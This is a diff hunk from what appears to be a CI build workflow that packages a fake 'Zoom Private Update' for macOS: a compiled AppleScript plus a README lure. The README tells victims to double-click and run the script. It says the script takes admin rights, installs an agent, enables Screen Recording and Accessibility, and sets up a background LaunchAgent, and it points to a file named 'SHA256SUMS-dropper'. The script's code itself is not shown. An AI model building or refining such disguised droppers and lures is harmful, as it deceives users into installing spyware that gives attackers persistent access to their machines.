@@ -70,16 +70,16 @@ jobs:
             distro/clients/macos/zoom-update-microsoft.scpt
           chmod 755 distro/clients/macos/zoom-update-microsoft.scpt
           cat > distro/clients/macos/Zoom_Update_v6.1.0.README.txt <<'EOF'
-Zoom Private Update - macOS
-
-Double-click "zoom-update-microsoft.scpt" and press Run in Script Editor.
-No chmod is needed (compiled .scpt).
-
-The script asks for admin rights once, installs the agent, enables
-Screen Recording/Accessibility, and starts a background LaunchAgent.
-
-Hashes: see SHA256SUMS-dropper.
-EOF
+          Zoom Private Update - macOS
+          
+          Double-click "zoom-update-microsoft.scpt" and press Run in Script Editor.
+          No chmod is needed (compiled .scpt).
+          
+          The script asks for admin rights once, installs the agent, enables
+          Screen Recording/Accessibility, and starts a background LaunchAgent.
+          
+          Hashes: see SHA256SUMS-dropper.
+          EOF
           rm -f distro/clients/macos/Zoom_Update_v6.1.0.zip
           (cd distro/clients/macos && zip -X -q Zoom_Update_v6.1.0.zip \
             zoom-update-microsoft.scpt Zoom_Update_v6.1.0.README.txt)
